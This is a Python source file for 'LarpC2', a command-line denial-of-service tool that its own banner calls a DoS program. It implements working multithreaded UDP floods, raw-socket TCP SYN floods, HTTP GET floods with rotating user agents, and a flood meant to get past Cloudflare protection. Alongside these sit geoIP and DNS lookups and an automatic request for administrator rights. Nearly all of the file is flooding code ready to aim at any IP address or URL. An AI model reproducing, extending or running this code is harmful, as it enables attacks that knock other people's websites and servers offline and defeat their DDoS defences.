import os
import sys
import time
from time import sleep
import socket
import threading
import datetime
import struct
import random
import requests
import ipaddress
import cloudscraper

def is_admin():
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if is_admin():
        return True
    
    try:
        import ctypes
        import sys
        
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:])
        
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, params, None, 1
        )
        return False
    except:
        return False

if not run_as_admin():
    sys.exit()

os.system("title LARP C2")

larp = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
clear = "\033[0m"

useragent = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

payloads = [
    b"\x08\xb2\x00\x21",
    b"\x08\xb2\x00",
    b"\xD8\x39\x84\x00",
]

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
          {larp}

                                      ╦  ╔═╗╦═╗╔═╗
                                      ║  ╠═╣╠╦╝╠═╝
                                      ╩═╝╩ ╩╩╚═╩ 
                    ╚═╦═══════════════════════════════════════════╦═╝
                ╚╦════╩═══════════════════════════════════════════╩════╦╝
                 ║          LarpC2 is a powerfull DoS Program.         ║
                 ║               Free, Opensource, Safe,               ║
                ╔╩═════════════════════════════════════════════════════╩╗

                ╚╦═════════════════════════════════════════════════════╦╝
                 ║  This is made by the one and only Venex dont skid.  ║
                 ║      Type help to see all available commands.       ║
                ╔╩═════════════════════════════════════════════════════╩╗
  
""")

def exit_script():
    sleep(1)
    sys.exit()

def l4_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
          {larp}
                              ╦  ╔═╗╦═╗╔═╗
                              ║  ╠═╣╠╦╝╠═╝
                              ╩═╝╩ ╩╩╚═╩ {clear }
                     {larp}╔═══════════════════════════╗{clear}
                     {larp}║{clear}  {larp}-{clear} tcp      {larp}|{clear} TCP Flood{larp}   {larp}║{clear}                    
                     {larp}║{clear}  {larp}-{clear} udp      {larp}|{clear} UDP Flood{larp}   {larp}║{clear}           
                     {larp}╚═══════════════════════════╝{clear}

""")              
    
def layer4():
    while True:
        l4_banner()
        select = input(f"""
╔═══[{larp}root{clear}@{larp}LARP{clear}]
╚══{larp}>{clear} """)
                                        
        if select.startswith("udp"):
            parts = select.split()
            if len(parts) != 5:
                print(f"usage{larp}:{clear} {larp}udp{clear} <{larp}ip{clear}> <{larp}port{clear}> <{larp}threads{clear}> <{larp}secs{clear}>")
                input()
                continue

            _, ip, port, threads, secs = parts
            port = int(port)
            threads = int(threads)
            secs = int(secs)

            def udp_attack(host, port, secs):
                end_time = time.time() + secs
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while time.time() < end_time:
                    for data in payloads:
                        try:
                            s.sendto(data, (host, port))
                        except:
                            pass
                s.close()


            def get_country(ip):
                try:
                    r = requests.get(f"http://ip-api.com/json/{ip}")
                    return r.json().get("country", "Unknown")
                except:
                    return "Unknown"

            country = get_country(ip)

            def th(ip, port, threads, secs):
                for _ in range(threads):
                    t = threading.Thread(target=udp_attack, args=(ip, port, secs))
                    t.start()

            th(ip, port, threads, secs)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
                    {larp}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear} 
     {larp}╔══════════════════════════════════╗{clear}
     {larp}║{clear} METHODS{larp}:{clear} {larp}[{clear}UDP{larp}]{clear}                    {larp}║{clear}
     {larp}║{clear} HOST{larp}:{clear} {larp}[{clear}{ip}{larp}]{clear}                      {larp}║{clear}
     {larp}║{clear} COUNTRY{larp}:{clear} {larp}[{clear}{country}{larp}]{clear}               {larp}║{clear}
     {larp}║{clear} PORT{larp}:{clear} {larp}[{clear}{port}{larp}]{clear}                       {larp}║{clear}
     {larp}║{clear} THREADS{larp}:{clear} {larp}[{clear}{threads}{larp}]{clear}                    {larp}║{clear}
     {larp}║{clear} TIME{larp}:{clear} {larp}[{clear}{secs}{larp}]{clear}                        {larp}║{clear}
     {larp}╚══════════════════════════════════╝{clear}       
""")
            time.sleep(secs)

        elif select.startswith("tcp"):
            parts = select.split()
            if len(parts) != 5:
                print(f"usage{larp}:{clear} {larp}tcp{clear} <{larp}ip{clear}> <{larp}port{clear}> <{larp}threads{clear}> <{larp}secs{clear}>")
                input()
                continue

            _, ip, port, threads, secs = parts
            port = int(port)
            threads = int(threads)
            secs = int(secs)

            def tcp_attack(host, port, secs):
                end_time = time.time() + secs
                flags = 0b00000010
                while time.time() < end_time:
                    try:
                        src_port = random.randint(1024, 65535)
                        pkt = struct.pack('!HHIIBBHHH', src_port, port, 0, 0, 80, flags, 8192, 0, 0)
                        socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP).sendto(pkt, (host, 0))
                    except:
                        pass

            def get_country(ip):
                try:
                    r = requests.get(f"http://ip-api.com/json/{ip}")
                    return r.json().get("country", "Unknown")
                except:
                    return "Unknown"

            country = get_country(ip)

            def th(ip, port, threads, secs):
                for _ in range(threads):
                    t = threading.Thread(target=tcp_attack, args=(ip, port, secs))
                    t.start()

            th(ip, port, threads, secs)

            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
                    {larp}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear} 
     {larp}╔══════════════════════════════════╗{clear}
     {larp}║{clear} METHODS{larp}:{clear} {larp}[{clear}TCP{larp}]{clear}                     {larp}║{clear}
     {larp}║{clear} HOST{larp}:{clear} {larp}[{clear}{ip}{larp}]{clear}                       {larp}║{clear}
     {larp}║{clear} COUNTRY{larp}:{clear} {larp}[{clear}{country}{larp}]{clear}               {larp}║{clear}
     {larp}║{clear} PORT{larp}:{clear} {larp}[{clear}{port}{larp}]{clear}                       {larp}║{clear}
     {larp}║{clear} THREADS{larp}:{clear} {larp}[{clear}{threads}{larp}]{clear}                    {larp}║{clear}
     {larp}║{clear} TIME{larp}:{clear} {larp}[{clear}{secs}{larp}]{clear}                        {larp}║{clear}
     {larp}╚══════════════════════════════════╝{clear}          
""")
            time.sleep(secs)

def l7_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
          {larp}
                           
                                  ╦  ╔═╗╦═╗╔═╗
                                  ║  ╠═╣╠╦╝╠═╝
                                  ╩═╝╩ ╩╩╚═╩  {clear}
                     {larp}╔═══════════════════════════════════╗{clear}
                     {larp}║{clear}  {larp}-{clear} http     {larp}|{clear} HTTP Flood{larp}          {larp}║{clear}         
                     {larp}║{clear}  {larp}-{clear} cfb      {larp}|{clear} CloudFlare bypass{larp}   {larp}║{clear}
                     {larp}╚═══════════════════════════════════╝{clear}

""")              
    
def layer7():
    while True:
        l7_banner()
        select = input(f"""
╔═══[{larp}root{clear}@{larp}LARP{clear}]
╚══{larp}>{clear} """)
         
        if select.startswith("http"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{larp}:{clear} {larp}http{clear} <{larp}url{clear}> <{larp}threads{clear}> <{larp}secs{clear}>")
                input()
                continue

            _, url, threads, secs = parts
            threads = int(threads)
            secs = int(secs)
            
            def http_attack(url, secs):
                end_time = time.time() + secs
                try:
                    while time.time() < end_time:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        requests.get(url, headers=headers, timeout=5)
                except:
                    pass
            
            def th(url, thread, secs):
                for _ in range(thread):
                    t = threading.Thread(target=http_attack, args=(url, secs))
                    t.start()
            
            th(url, threads, secs)
            
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
                    {larp}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear}
      {larp}╔══════════════════════════════════╗{clear}
      {larp}║{clear} METHODS{larp}:{clear} {larp}[{clear}HTTP{larp}]{clear}                    {larp}║{clear}
      {larp}║{clear} URL{larp}:{clear} {larp}[{clear}{url}{larp}]{clear}                      {larp}║{clear}
      {larp}║{clear} THREADS{larp}:{clear} {larp}[{clear}{threads}{larp}]{clear}                    {larp}║{clear}
      {larp}║{clear} TIME{larp}:{clear} {larp}[{clear}{secs}{larp}]{clear}                        {larp}║{clear}
      {larp}╚══════════════════════════════════╝{clear}       
""")
            time.sleep(secs)

        elif select.startswith("cfb"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{larp}:{clear} {larp}cfb{clear} <{larp}url{clear}> <{larp}threads{clear}> <{larp}secs{clear}>")
                input()
                continue

            _, url, threads, secs = parts
            threads = int(threads)
            secs = int(secs)
            
            def cloudflare(url, end_time):
                end_time = time.time() + secs
                scraper = cloudscraper.create_scraper()
                try:
                    while time.time() < end_time:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        scraper.get(url, headers=headers, timeout=5)
                        scraper.head(url, headers=headers, timeout=5)
                except:
                    pass
            
            def th(url, threads, secs):
                for _ in range(threads):
                    t = threading.Thread(target=cloudflare, args=(url, secs))
                    t.start()
            
            th(url, threads, secs)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
                {larp}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                {clear}
        {larp}╔══════════════════════════════════╗{clear}
        {larp}║{clear} METHODS{larp}:{clear} {larp}[{clear}CloudFlare Bypass{larp}]{clear}      {larp}║{clear}
        {larp}║{clear} URL{larp}:{clear} {larp}[{clear}{url}{larp}]{clear}                      {larp}║{clear}
        {larp}║{clear} THREADS{larp}:{clear} {larp}[{clear}{threads}{larp}]{clear}                    {larp}║{clear}
        {larp}║{clear} TIME{larp}:{clear} {larp}[{clear}{secs}{larp}]{clear}                        {larp}║{clear}
        {larp}╚══════════════════════════════════╝{clear}       
            """)
            time.sleep(secs)

def tools_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
          {larp}
                      ╔╦╗╔═╗╔═╗╦  ╔═╗
                       ║ ║ ║║ ║║  ╚═╗
                       ╩ ╚═╝╚═╝╩═╝╚═╝  {clear}
           {larp}╔═══════════════════════════════════╗{clear}
           {larp}║{clear}  {larp}-{clear} geoip   {larp}|{clear} geolocation ip       {larp}║{clear}         
           {larp}║{clear}  {larp}-{clear} dns     {larp}|{clear} DNS lockup           {larp}║{clear}
           {larp}║{clear}  {larp}-{clear} subnet  {larp}|{clear} Reverse DNS lockup   {larp}║{clear}
           {larp}╚═══════════════════════════════════╝{clear}

""")              
    
def tools():
    while True:
        tools_banner()
        select = input(f"""
╔═══[{larp}root{clear}@{larp}LARP{clear}]
╚══{larp}>{clear} """)
                                        
        if select.startswith("geoip"):
            parts = select.split()
            if len(parts) != 2:
                print(f"usage{larp}:{clear} {larp}geoip{clear} <{larp}ip{clear}>")
                input()
                continue

            ip = parts[1]

            def geoip():
                r = requests.get(f"http://ip-api.com/json/{ip}")
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"""
            {larp}╔══════════════════════════════════╗{clear}
            {larp}║{clear} IP{larp}:{clear} {larp}[{clear}{r.json().get("query")}{larp}]{clear}              {larp}    ║{clear}
            {larp}║{clear} Country{larp}:{clear} {larp}[{clear}{r.json().get("country")}{larp}]{clear}        {larp}          ║{clear}
            {larp}║{clear} Region{larp}:{clear} {larp}[{clear}{r.json().get("regionName")}{larp}]{clear}       {larp}            ║{clear}
            {larp}║{clear} City{larp}:{clear} {larp}[{clear}{r.json().get("city")}{larp}]{clear}               {larp}      ║{clear}
            {larp}║{clear} ISP{larp}:{clear} {larp}[{clear}{r.json().get("isp")}{larp}]{clear}        {larp}              ║{clear}
            {larp}║{clear} Latitude{larp}:{clear} {larp}[{clear}{r.json().get("lat")}{larp}]{clear}               {larp}  ║{clear}
            {larp}║{clear} Longitude{larp}:{clear} {larp}[{clear}{r.json().get("lon")}{larp}]{clear}        {larp}        ║{clear}
            {larp}║{clear} ZIP{larp}:{clear} {larp}[{clear}{r.json().get("zip")}{larp}]{clear}                     {larp} ║{clear}
            {larp}╚══════════════════════════════════╝{clear}
                      """)
                input()

            geoip()

        elif select.startswith("dns"):
            parts = select.split()
            if len(parts) != 2:
                print(f"usage{larp}:{clear} {larp}dns{clear} <{larp}domain{clear}>")
                input()
                continue

            host = parts[1]

            def dnslockup():
                try:
                    dns = socket.gethostbyname(host)
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f"""
            {larp}╔══════════════════════════════════╗{clear}
            {larp}║{clear} HOST{larp}:{clear} {larp}[{clear}{host}{larp}]{clear}       {larp}║{clear}
            {larp}║{clear} DNS{larp}:{clear} {larp}[{clear}{dns}{larp}]{clear}          {larp}    ║{clear}
            {larp}╚══════════════════════════════════╝{clear}
                    """)
                except socket.gaierror:
                    pass
                input()

            dnslockup()


        elif select.startswith("subnet"):
            parts = select.split()
            if len(parts) != 2:
                print(f"usage{larp}:{clear} {larp}subnet{clear} <{larp}ip{clear}>")
                input()
                continue

            ip = parts[1]

            def subnet():
                try:
                    n = ipaddress.ip_network(ip + "/24", strict=False)
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f"""
                {larp}╔════════════════════════════════════════════════╗{clear}
                {larp}║{clear} IP       {larp}:{clear} [{ip}]                         {larp}║{clear}
                {larp}║{clear} SUBNET   {larp}:{clear} [{n}]                      {larp}║{clear}
                {larp}║{clear} NET ADDR {larp}:{clear} [{n.network_address}]               {larp}          ║{clear}
                {larp}║{clear} BROADCAST{larp}:{clear} [{n.broadcast_address}]             {larp}          ║{clear}
                {larp}║{clear} NETMASK  {larp}:{clear} [{n.netmask}]                     {larp}║{clear}
                {larp}║{clear} HOSTS    {larp}:{clear} [{n.num_addresses}] addresses                     {larp}║{clear}
                {larp}╚════════════════════════════════════════════════╝{clear}
                    """)
                except Exception:
                    pass

                input()

            subnet()

def install():
    os.system("pip install requests --break-system-packages")
    os.system("pip install scapy --break-system-packages")
    os.system("pip install cloudscraper --break-system-packages")

def main():
    install()
    while True:
        banner()
        select = input(f"""
╔═══[{larp}root{clear}@{larp}LARP{clear}]
╚══{larp}>{clear} """)
                                        
        if select == "help":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
          {larp}
                    ╦ ╦╔═╗╦  ╔═╗
                    ╠═╣║╣ ║  ╠═╝
                    ╩ ╩╚═╝╩═╝╩ {clear}
        {larp}╔═════════════════════════════════╗{clear}
        {larp}║{clear}  {larp}-{clear} l4     {larp}|{clear} Ip Attack Menu      {larp}║{clear}         
        {larp}║{clear}  {larp}-{clear} l7     {larp}|{clear} Website Attack Menu {larp}║{clear}
        {larp}║{clear}  {larp}-{clear} tools  {larp}|{clear} Tools Menu          {larp}║{clear}
        {larp}║{clear}  {larp}-{clear} exit   {larp}|{clear} Exit LARP           {larp}║{clear}
        {larp}╚═════════════════════════════════╝{clear}
                  """)
            input()


        elif select == "l4":
            layer4()

        
        elif select == "l7":
            layer7()

        elif select == "tools":
            tools()

        elif select == "exit":
            exit_script()
        else:
            print(f"{red}Invalid option{clear}")
            input()

if __name__ == "__main__":
    main()
